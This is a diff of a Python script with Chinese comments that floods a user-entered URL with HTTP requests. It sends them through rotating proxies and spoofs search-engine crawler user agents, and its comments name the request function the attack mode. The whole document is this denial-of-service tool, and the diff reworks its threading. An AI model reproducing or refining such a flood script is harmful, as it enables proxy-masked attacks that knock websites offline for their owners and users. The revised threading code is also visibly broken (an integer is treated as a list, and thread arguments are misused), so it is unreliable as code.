@@ -1,4 +1,4 @@
-﻿#!/usr/bin/python
+#!/usr/bin/python
 # -*- coding: UTF-8 -*-
 import random
 import threading
@@ -8,7 +8,7 @@ import os,sys
 import time
 
 def readIPs():#读取所有的代理ip与ua
-    r=open('proxiesIP.txt','r')
+    r=open('proxiesIP.txt','r+')
     aline=r.readlines()#读取所有行
     r.close()
     return aline
@@ -16,9 +16,9 @@ def readIPs():#读取所有的代理ip与ua
 #Basic
 url=input('请输入url（包括协议头，即http://或https://）,使用本脚本前请确认proxiesIP.txt内有代理IP再进行使用\n')
 threads=[]
-threads=input('请输入线程数，默认10\n')
+threads=5
 if (threads==[]):
-    threads=10
+    threads= 10
 ua=[
     'Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)',
     'Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)',
@@ -49,9 +49,9 @@ headers = {
 proxies = {
         'http':'http://'+random.choice(que()),
         'https':'https://'+random.choice(que())
-    }
+    }#定义更新代理ip
 
-def pct():
+def pct():#定义攻击模式
     requests.get(url, proxies=proxies, headers=headers)
     proxies.update({
         'http':random.choice(que()),
@@ -62,13 +62,17 @@ def pct():
     })#循环更新ua
     print(proxies)
 
-def attack():#定义多线程模式
-    t=threading.Thread(target=pct)
-    t.start()
-    # for t in threads:
-    #     t.join()
-    
-        # threads.append(t)
-    # for t in threads:
-    #     t.join()
-attack()   #程序主入口点
+class attack_thread(threading.Thread):#多线程
+    def __init__(self,target):
+        self.target=target
+        self.t=threading.Thread(self.target)
+        threads.append(self.t)
+
+        
+    def run(self):#开启线程
+        for t in threads:
+            t.start()
+
+attack_thread(pct()).run()#程序入口
+
+#本次更新了多线程算法，修复了因循环创建线程而引起的资源大量堵塞
